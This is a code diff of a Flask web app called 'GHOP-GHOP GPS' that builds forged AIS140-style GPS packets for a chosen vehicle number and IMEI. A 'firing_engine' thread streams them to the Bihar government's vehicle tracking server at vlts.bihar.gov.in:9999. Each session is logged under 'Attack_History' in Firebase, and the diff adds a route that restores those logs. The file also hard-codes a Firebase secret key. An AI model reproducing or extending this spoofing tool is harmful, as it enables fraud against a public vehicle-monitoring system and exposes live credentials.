@@ -10,12 +10,12 @@ FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"
 
 TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]
 
-# Individual user memory store
 user_sessions = {}
 
 def get_ist_time():
     return datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
 
+# --- UI HTML ---
 LOGIN_HTML = """
 <!DOCTYPE html>
 <html>
@@ -32,7 +32,6 @@ LOGIN_HTML = """
 <body>
     <div class="login-box">
         <h2>🫦 GHOP-GHOP GPS</h2>
-        {% if error %}<div style="color:red; font-size:12px; margin-bottom:10px;">{{error}}</div>{% endif %}
         <form method="post">
             <input type="text" name="userid" placeholder="USER ID" required>
             <input type="password" name="password" placeholder="PASSWORD" required>
@@ -61,8 +60,6 @@ DASH_HTML = """
         .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
         .start { background: #008000; color: #fff; }
         .stop { background: #800; color: #fff; }
-        .reset { background: #333; color: #fff; border: 1px solid #444; }
-        .gps { background: #004466; color: #fff; border: 1px solid #00ffff; }
         .preview { background: #111; color: yellow; padding: 12px; font-size: 11px; word-break: break-all; margin-top: 15px; border: 1px dashed #0f0; min-height: 60px; }
     </style>
 </head>
@@ -72,55 +69,33 @@ DASH_HTML = """
         <h2 style="margin-top:10px;">💋 GHOP-GHOP GPS 💋</h2>
         <div class="metric" id="cnt">0</div>
         <form action="/action" method="post" class="grid">
-            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{status.vno}}" oninput="this.value = this.value.toUpperCase(); updatePreview();" onblur="checkVehicle()"></div>
-            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{status.imei}}" oninput="updatePreview();"></div>
+            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{status.vno}}" oninput="this.value = this.value.toUpperCase();" onblur="checkVehicle()"></div>
+            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{status.imei}}"></div>
             <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{status.lat}}"></div>
             <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{status.lon}}"></div>
-            <button type="button" class="btn gps full" onclick="getLocation()">📍 GET CURRENT LOCATION</button>
-            <div class="full"><label>📋 PACKET PREVIEW (MIJO FORMAT)</label><div class="preview" id="preview">Ready...</div></div>
+            <div class="full"><label>📋 PACKET PREVIEW</label><div class="preview" id="preview">Ready...</div></div>
             <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
             <button class="btn stop full" name="btn" value="stop">🛑 STOP ENGINE</button>
-            <button class="btn reset full" name="btn" value="reset">🔄 RESET ALL</button>
         </form>
     </div>
-    <div id="map"></div>
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        var map = L.map('map').setView([{{status.lat}}, {{status.lon}}], 15);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        var marker = L.marker([{{status.lat}}, {{status.lon}}]).addTo(map);
-        function updateMap(lat, lon) { marker.setLatLng([lat, lon]); map.setView([lat, lon], 15); }
-        function getLocation() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(pos => { let lt = pos.coords.latitude.toFixed(6); let ln = pos.coords.longitude.toFixed(6); document.getElementById('lat').value = lt; document.getElementById('lon').value = ln; updateMap(lt, ln); updatePreview(); }, null, {enableHighAccuracy:true}); } }
-        function updatePreview() {
-            let tags = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"];
-            let cnt = parseInt(document.getElementById('cnt').innerText) || 0;
-            let tag = tags[cnt % tags.length];
-            let imei = document.getElementById('imei').value;
-            let vno = document.getElementById('vno').value;
-            let lat = document.getElementById('lat').value;
-            let lon = document.getElementById('lon').value;
-            let d = new Date().toLocaleDateString('en-GB').replace(/\//g, '');
-            let t = new Date().toLocaleTimeString('en-GB', {hour12:false}).replace(/:/g, '');
-            document.getElementById('preview').innerText = `$PVT,${tag},1.ONTC,NR,01,L,${imei},${vno},1,${d},${t},${lat},N,${lon},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*`;
-        }
         async function checkVehicle() {
             let vno = document.getElementById('vno').value.toUpperCase(); if(!vno) return;
             let res = await fetch(`/check_vehicle?vno=${vno}`); let data = await res.json();
-            if(data.imei) { document.getElementById('imei').value = data.imei; updatePreview(); }
+            if(data.imei) { document.getElementById('imei').value = data.imei; }
         }
         setInterval(() => {
             fetch('/data').then(r => r.json()).then(d => {
                 document.getElementById('cnt').innerText = d.count;
                 if(d.firing) document.getElementById('preview').innerText = d.last_pkt;
-                else updatePreview();
             });
         }, 1000);
-        updatePreview();
     </script>
 </body>
 </html>
 """
 
+# --- LOGIC ---
 def firing_engine(uid):
     target = ("vlts.bihar.gov.in", 9999)
     while uid in user_sessions and user_sessions[uid]["firing"]:
@@ -141,13 +116,11 @@ def firing_engine(uid):
 def login():
     if 'user' in session: return redirect(url_for('dashboard'))
     if request.method == 'POST':
-        uid = request.form.get('userid', '').strip()
-        pw = request.form.get('password', '').strip()
+        uid, pw = request.form.get('userid').strip(), request.form.get('password').strip()
         data = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}").json()
         if data and str(data.get('password')) == str(pw):
             session['user'] = uid
-            if uid not in user_sessions:
-                user_sessions[uid] = {"firing": False, "count": 0, "imei": "", "vno": "", "lat": str(data.get('lat', '25.298801')), "lon": str(data.get('lon', '84.651033')), "last_pkt": "Ready...", "session_id": ""}
+            user_sessions[uid] = {"firing": False, "count": 0, "imei": "", "vno": "", "lat": "25.298801", "lon": "84.651033", "last_pkt": "Ready..."}
             return redirect(url_for('dashboard'))
     return render_template_string(LOGIN_HTML)
 
@@ -160,20 +133,17 @@ def dashboard():
 @app.route('/action', methods=['POST'])
 def action():
     uid = session.get('user')
-    if not uid or uid not in user_sessions: return redirect(url_for('login'))
+    if not uid: return redirect(url_for('login'))
     val = request.form.get('btn')
     if val == "start":
-        vno, imei = request.form.get('vno', '').strip().upper(), request.form.get('imei', '').strip()
-        if not vno or not imei: return redirect(url_for('dashboard'))
-        if not user_sessions[uid]["firing"]:
-            user_sessions[uid].update({"firing": True, "vno": vno, "imei": imei, "lat": request.form.get('lat'), "lon": request.form.get('lon'), "session_id": get_ist_time().strftime('%H%M%S'), "count": 0})
-            now = get_ist_time()
-            log_data = {"Vehicle_No": vno, "IMEI_No": imei, "Lat": user_sessions[uid]["lat"], "Lon": user_sessions[uid]["lon"], "Start_Time": now.strftime('%H:%M:%S')}
-            requests.put(f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{uid}/{user_sessions[uid]['session_id']}_{vno}.json?auth={FB_SECRET}", json=log_data)
+        vno, imei = request.form.get('vno').strip().upper(), request.form.get('imei').strip()
+        if vno and imei:
+            user_sessions[uid].update({"firing": True, "vno": vno, "imei": imei, "lat": request.form.get('lat'), "lon": request.form.get('lon'), "count": 0})
+            log_data = {"Vehicle_No": vno, "IMEI_No": imei, "Lat": user_sessions[uid]["lat"], "Lon": user_sessions[uid]["lon"], "Time": get_ist_time().strftime('%H:%M:%S')}
             requests.put(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", json=log_data)
+            requests.put(f"{FB_URL}/Attack_History/{get_ist_time().strftime('%Y-%m-%d')}/{uid}/{vno}.json?auth={FB_SECRET}", json=log_data)
             threading.Thread(target=firing_engine, args=(uid,), daemon=True).start()
-    elif val == "stop": user_sessions[uid]["firing"] = False
-    elif val == "reset": user_sessions[uid].update({"firing": False, "count": 0, "imei": "", "vno": ""})
+    else: user_sessions[uid]["firing"] = False
     return redirect(url_for('dashboard'))
 
 @app.route('/check_vehicle')
@@ -186,6 +156,21 @@ def check_vehicle():
 def data():
     uid = session.get('user')
     return jsonify(user_sessions.get(uid, {"count": 0, "firing": False}))
+
+# --- RECOVERY ROUTE ---
+@app.route('/restore_my_data')
+def restore_data():
+    history = requests.get(f"{FB_URL}/Attack_History.json?auth={FB_SECRET}").json()
+    count = 0
+    if history:
+        for date in history:
+            for user in history[date]:
+                for vno_key in history[date][user]:
+                    item = history[date][user][vno_key]
+                    if item.get('Vehicle_No') and item.get('IMEI_No'):
+                        requests.put(f"{FB_URL}/Data_Records/{item['Vehicle_No']}.json?auth={FB_SECRET}", json=item)
+                        count += 1
+    return f"Bhai, {count} vehicles ka data wapas aa gaya hai!"
 
 @app.route('/logout', methods=['POST'])
 def logout(): session.clear(); return redirect(url_for('login'))
